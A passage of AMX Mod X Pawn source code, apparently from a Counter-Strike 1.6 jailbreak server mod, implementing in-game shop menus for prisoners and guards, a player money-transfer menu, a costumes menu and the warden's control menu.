			if(IsNotSetBit(g_iBitBalisong, id) && iPriceBalisong <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceBalisong, 1);
				ClearBit(g_iBitSharpening, id);
				ClearBit(g_iBitScrewdriver, id);
				ClearBit(g_iBitMachete, id);
				SetBit(g_iBitBalisong, id);
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_BALISONG");
                UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);				
				if(IsSetBit(g_iBitWeaponStatus, id) && get_user_weapon(id) == CSW_KNIFE)
				{
					new iActiveItem = get_pdata_cbase(id, m_pActiveItem);
					if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				}
				else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_HELP");				
			}
		}		
		case 1:
		{
			new iPriceMachete = jbe_get_price_discount(id, g_iShopCvars[MACHETE]);
			if(IsNotSetBit(g_iBitMachete, id) && iPriceMachete <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceMachete, 1);
				ClearBit(g_iBitSharpening, id);
				ClearBit(g_iBitScrewdriver, id);
				ClearBit(g_iBitBalisong, id);
				SetBit(g_iBitMachete, id);
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_MACHETE");
                UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);				
				if(IsSetBit(g_iBitWeaponStatus, id) && get_user_weapon(id) == CSW_KNIFE)
				{
					new iActiveItem = get_pdata_cbase(id, m_pActiveItem);
					if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				}
				else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_HELP");				
			}
		}	
		case 2:
		{
			new iPriceSerp = jbe_get_price_discount(id, g_iShopCvars[SERP]);
			if(IsNotSetBit(g_iBitSerp, id) && iPriceSerp <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceSerp, 1);
				ClearBit(g_iBitSharpening, id);
				ClearBit(g_iBitScrewdriver, id);
				ClearBit(g_iBitBalisong, id);
				ClearBit(g_iBitMachete, id);
				SetBit(g_iBitSerp, id);
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_SERP");
                UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);				
				if(IsSetBit(g_iBitWeaponStatus, id) && get_user_weapon(id) == CSW_KNIFE)
				{
					new iActiveItem = get_pdata_cbase(id, m_pActiveItem);
					if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				}
				else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_HELP");				
			}
		}
		case 8: return Show_ShopPnMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MenuShopWeapons(id);
}

Show_MenuShopPn(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	jbe_set_user_discount(id);
	new szMenu[512], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SHOP_PN_TITTLES", g_iUserDiscount[id]);	
	new iPriceDoubleJump = jbe_get_price_discount(id, g_iShopCvars[DOUBLE_JUMP]);
	if(IsNotSetBit(g_iBitDoubleJump, id))
	{
		if(iPriceDoubleJump <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_DOUBLE_JUMP", iPriceDoubleJump);
			iKeys |= (1<<0);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_DOUBLE_JUMP", iPriceDoubleJump);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_DOUBLE_JUMP", iPriceDoubleJump);
	new iPriceAutoBhop = jbe_get_price_discount(id, g_iShopCvars[AUTO_BHOP]);
	if(IsNotSetBit(g_iBitAutoBhop, id))
	{
		if(iPriceAutoBhop <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_AUTO_BHOP", iPriceAutoBhop);
			iKeys |= (1<<1);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_AUTO_BHOP", iPriceAutoBhop);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_AUTO_BHOP", iPriceAutoBhop);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MenuShopPn");
}

public Handle_MenuShopPn(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0:
		{
			new iPriceDoubleJump = jbe_get_price_discount(id, g_iShopCvars[DOUBLE_JUMP]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_DOUBLE_JUMP");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(iPriceDoubleJump <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceDoubleJump, 1);
				SetBit(g_iBitDoubleJump, id);			
			}
		}
		case 1:
		{
			new iPriceAutoBhop = jbe_get_price_discount(id, g_iShopCvars[AUTO_BHOP]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_AUTO_BHOP");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(iPriceAutoBhop <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceAutoBhop, 1);
				SetBit(g_iBitAutoBhop, id);			
			}
		}	
		case 8: return Show_ShopPnMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MenuShopPn(id);
}

Show_ShopGuardMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SHOP_GUARD_TITLE");
	
	new iPriceDoubleJump = jbe_get_price_discount(id, g_iShopCvars[DOUBLE_JUMP_GR]);
	if(IsNotSetBit(g_iBitDoubleJump, id))
	{
		if(iPriceDoubleJump <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_DOUBLE_JUMP", iPriceDoubleJump);
			iKeys |= (1<<0);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_DOUBLE_JUMP", iPriceDoubleJump);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_DOUBLE_JUMP", iPriceDoubleJump);
	
	new iPriceFastRun = jbe_get_price_discount(id, g_iShopCvars[FAST_RUN_GR]);
	if(IsNotSetBit(g_iBitFastRun, id))
	{
		if(iPriceFastRun <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_FAST_RUN", iPriceFastRun);
			iKeys |= (1<<1);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_FAST_RUN", iPriceFastRun);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_FAST_RUN", iPriceFastRun);
	new iPriceLowGravity = jbe_get_price_discount(id, g_iShopCvars[LOW_GRAVITY_GR]);
	if(pev(id, pev_gravity) == 1.0)
	{
		if(iPriceLowGravity <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L \r$%d^n^n", id, "JBE_MENU_SHOP_GUARD_LOW_GRAVITY", iPriceLowGravity);
			iKeys |= (1<<2);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n^n", id, "JBE_MENU_SHOP_GUARD_LOW_GRAVITY", iPriceLowGravity);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n^n", id, "JBE_MENU_SHOP_GUARD_LOW_GRAVITY", iPriceLowGravity);
	
	new iPriceStimulator = jbe_get_price_discount(id, g_iShopCvars[STIMULATOR_GR]);
	if(get_user_health(id) < 250)
	{
		if(iPriceStimulator <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_STIMULATOR", iPriceStimulator);
			iKeys |= (1<<3);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_STIMULATOR", iPriceStimulator);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_STIMULATOR", iPriceStimulator);
	
	new iPriceKokain = jbe_get_price_discount(id, g_iShopCvars[KOKAIN_GR]);
	if(IsNotSetBit(g_iBitKokain, id))
	{
		if(iPriceKokain <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_KOKAIN", iPriceKokain);
			iKeys |= (1<<4);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_KOKAIN", iPriceKokain);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_KOKAIN", iPriceKokain);
	
	new iPriceAwpGr = jbe_get_price_discount(id, g_iShopCvars[AWP_GR]);
	if(iPriceAwpGr <= g_iUserMoney[id])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_AWP", iPriceAwpGr);
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_GUARD_AWP", iPriceAwpGr);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_ShopGuardMenu");
}

public Handle_ShopGuardMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0:
		{
			new iPriceDoubleJump = jbe_get_price_discount(id, g_iShopCvars[DOUBLE_JUMP_GR]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_DOUBLE_JUMP");
			UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);	
			if(iPriceDoubleJump <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceDoubleJump, 1);
				SetBit(g_iBitDoubleJump, id);
			}
		}
		case 1:
		{
			new iPriceFastRun = jbe_get_price_discount(id, g_iShopCvars[FAST_RUN_GR]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_FAST_RUN");
			UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);	
			if(iPriceFastRun <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceFastRun, 1);
				SetBit(g_iBitFastRun, id);
				ExecuteHamB(Ham_Player_ResetMaxSpeed, id);
			}
		}
		case 2:
		{
			new iPriceLowGravity = jbe_get_price_discount(id, g_iShopCvars[LOW_GRAVITY_GR]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_GRAVITI");
			UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);	
			if(iPriceLowGravity <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceLowGravity, 1);
				set_pev(id, pev_gravity, 0.6);
			}
		}
		case 3:
		{
			new iPriceStimulator = jbe_get_price_discount(id, g_iShopCvars[STIMULATOR_GR]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_STIMYLATORS");
			UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);	
			if(get_user_health(id) < 250 && iPriceStimulator <= g_iUserMoney[id])
			{
			    jbe_set_user_money(id, g_iUserMoney[id] - iPriceStimulator, 1);
				set_pev(id, pev_health, 250.0);
			}
		}
		case 4:
		{
			new iPriceKokain = jbe_get_price_discount(id, g_iShopCvars[KOKAIN_GR]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_KOKAIN_GR");
			UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);	
			if(IsNotSetBit(g_iBitKokain, id) && iPriceKokain <= g_iUserMoney[id])
			{
			    jbe_set_user_money(id, g_iUserMoney[id] - iPriceKokain, 1);
				SetBit(g_iBitKokain, id);
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_MENU_ID_KOKAIN");
			}
		}
		case 5:
        {
		    new iPriceAwpGr = jbe_get_price_discount(id, g_iShopCvars[AWP_GR]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_AWP");
			UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);	
            if(iPriceAwpGr <= g_iUserMoney[id])
			{  
			   jbe_set_user_money(id, g_iUserMoney[id] - iPriceAwpGr, 1);
               fm_give_item(id, "weapon_awp");
               fm_set_user_bpammo(id, CSW_AWP, 228);
			}
        }
		case 8: return Show_MainGrMenu(id);
	}
	return PLUGIN_HANDLED;
}

Cmd_MoneyTransferMenu(id) return Show_MoneyTransferMenu(id, g_iMenuPosition[id] = 0);
Show_MoneyTransferMenu(id, iPos)
{
	if(iPos < 0) return PLUGIN_HANDLED;
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(IsNotSetBit(g_iBitUserConnected, i) || i == id) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_ChiefMenu_1(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n\d%L^n", id, "JBE_MENU_MONEY_TRANSFER_TITLE", iPos + 1, iPagesNum, id, "JBE_MENU_MONEY_YOU_AMOUNT", g_iUserMoney[id]);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s \r$%d^n", ++b, szName, g_iUserMoney[i]);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MoneyTransferMenu");
}

public Handle_MoneyTransferMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_MoneyTransferMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_MoneyTransferMenu(id, --g_iMenuPosition[id]);
		default:
		{
			g_iMenuTarget[id] = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			return Show_MoneyAmountMenu(id);
		}
	}
	return PLUGIN_HANDLED;
}

Show_MoneyAmountMenu(id)
{
	new szMenu[512], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n\d%L^n", id, "JBE_MENU_MONEY_AMOUNT_TITLE", id, "JBE_MENU_MONEY_YOU_AMOUNT", g_iUserMoney[id]);
	if(g_iUserMoney[id])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%d$^n", floatround(g_iUserMoney[id] * 0.10, floatround_ceil));
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%d$^n", floatround(g_iUserMoney[id] * 0.25, floatround_ceil));
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%d$^n", floatround(g_iUserMoney[id] * 0.50, floatround_ceil));
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%d$^n", floatround(g_iUserMoney[id] * 0.75, floatround_ceil));
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%d$^n^n^n", g_iUserMoney[id]);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_MONEY_SPECIFY_AMOUNT");
		iKeys |= (1<<0|1<<1|1<<2|1<<3|1<<4|1<<7);
	}
	else
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d0$^n\r[#] \d0$^n\r[#] \d0$^n\r[#] \d0$^n\r[#] \d0$^n^n^n");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MONEY_SPECIFY_AMOUNT");
	}
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MoneyAmountMenu");
}

public Handle_MoneyAmountMenu(id, iKey)
{
	switch(iKey)
	{
		case 0: ClCmd_MoneyTransfer(id, g_iMenuTarget[id], floatround(g_iUserMoney[id] * 0.10, floatround_ceil));
		case 1: ClCmd_MoneyTransfer(id, g_iMenuTarget[id], floatround(g_iUserMoney[id] * 0.25, floatround_ceil));
		case 2: ClCmd_MoneyTransfer(id, g_iMenuTarget[id], floatround(g_iUserMoney[id] * 0.50, floatround_ceil));
		case 3: ClCmd_MoneyTransfer(id, g_iMenuTarget[id], floatround(g_iUserMoney[id] * 0.75, floatround_ceil));
		case 4: ClCmd_MoneyTransfer(id, g_iMenuTarget[id], g_iUserMoney[id]);
		case 7: client_cmd(id, "messagemode ^"money_transfer %d^"", g_iMenuTarget[id]);
		case 8: return Show_MoneyTransferMenu(id, g_iMenuPosition[id]);
	}
	return PLUGIN_HANDLED;
}

Cmd_CostumesMenu(id) return Show_CostumesMenu(id, g_iMenuPosition[id] = 0);
Show_CostumesMenu(id, iPos)
{
	if(iPos < 0) return PLUGIN_HANDLED;
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > g_iCostumesListSize) iStart = g_iCostumesListSize;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > g_iCostumesListSize) iEnd = g_iCostumesListSize + (iPos ? 0 : 1);
	new szMenu[512], iLen, iPagesNum = (g_iCostumesListSize / PLAYERS_PER_PAGE + ((g_iCostumesListSize % PLAYERS_PER_PAGE) ? 1 : 0));
	new aDataCostumes[DATA_COSTUMES_PRECACHE];
	if(g_eUserCostumes[id][COSTUMES]) 
	{
		ArrayGetArray(g_aCostumesList, g_eUserCostumes[id][COSTUMES], aDataCostumes);
		iLen = formatex(szMenu, charsmax(szMenu), "\w%L [%d/%d]^n^n", id, "JBE_MENU_COSTUMES_TITLE", iPos + 1, iPagesNum);
	}
	else iLen = formatex(szMenu, charsmax(szMenu), "\w%L [%d/%d]^n^n", id, "JBE_MENU_COSTUMES_TITLE", iPos + 1, iPagesNum);
	new iKeys = (1<<9), b, iFlags = get_user_flags(id);
	for(new a = iStart; a < iEnd; a++)
	{
		ArrayGetArray(g_aCostumesList, a, aDataCostumes);
		
		if(aDataCostumes[FLAG_COSTUME])
		{
			if(iFlags & read_flags(aDataCostumes[FLAG_COSTUME]))
			{
				if(g_eUserCostumes[id][COSTUMES] != a)
				{
					iKeys |= (1<<b);
					iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, aDataCostumes[NAME_COSTUME]);
				}
				else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w>>> \r%s^n", aDataCostumes[NAME_COSTUME]);
			}
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \d%s \r'%s'^n", ++b, aDataCostumes[NAME_COSTUME], aDataCostumes[WARNING_MSG]);
		}
		else
		{
			if(g_eUserCostumes[id][COSTUMES] != a)
			{
				iKeys |= (1<<b|1<<7);
				iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, aDataCostumes[NAME_COSTUME]);
			}
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w>>> \r%s^n", aDataCostumes[NAME_COSTUME]);
		}
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < g_iCostumesListSize)
	{
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_CostumesMenu");
}

public Handle_CostumesMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_CostumesMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_CostumesMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iCostumes = g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey;
			jbe_set_user_costumes(id, iCostumes);
		}
	}
	return Show_CostumesMenu(id, g_iMenuPosition[id]);
}

Show_ChiefMenu_1(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<0|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_CHIEF_TITLE");
	if(g_bDoorStatus) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_CHIEF_DOOR_CLOSE");
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_CHIEF_DOOR_OPEN");
	if(g_iDayMode == 1)
	{
	    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_CHIEF_GOLOS");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_CHIEF_COUNTDOWN");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_CHIEF_FREE_DAY_CONTROL");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_CHIEF_MINI_GAME");
		iKeys |= (1<<1|1<<2|1<<3);
	}
	else
	{
	    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_CHIEF_GOLOS");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_CHIEF_COUNTDOWN");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_CHIEF_FREE_DAY_CONTROL");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_CHIEF_MINI_GAME");
	}
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_CHIEF_TREAT_WANTED");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_CHIEF_TREAT_PRISONER");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_CHIEF_TRANSFER_CHIEF");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_NEXT");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_ChiefMenu_1");
}

public Handle_ChiefMenu_1(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0:
		{
			if(g_bDoorStatus) jbe_close_doors();
			else jbe_open_doors();
		}
		case 1: return Cmd_VoiceControlMenuSimon(id);
		case 2: return Show_CountDownMenu(id);
		case 3: return Cmd_FreeDayControlMenu(id);
        case 4: return Show_MiniGameMenu_1(id);
		case 5: return Cmd_TakeWanted(id);
		case 6: return Cmd_TreatPrisonerMenu(id);
		case 7: return Cmd_TransferChiefMenu(id);
		case 8: return Show_ChiefMenu_2(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_ChiefMenu_1(id);
}

/* Начальник - Отобрать розыск -> */
Cmd_TakeWanted(id) return Show_TakeWanted(id, g_iMenuPosition[id] = 0);
Show_TakeWanted(id, iPos)
{
    if(iPos < 0 || g_iDayMode != 1 && g_iDayMode != 2 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsSetBit(g_iBitUserWanted, i) && IsSetBit(g_iBitUserAlive, i)) g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
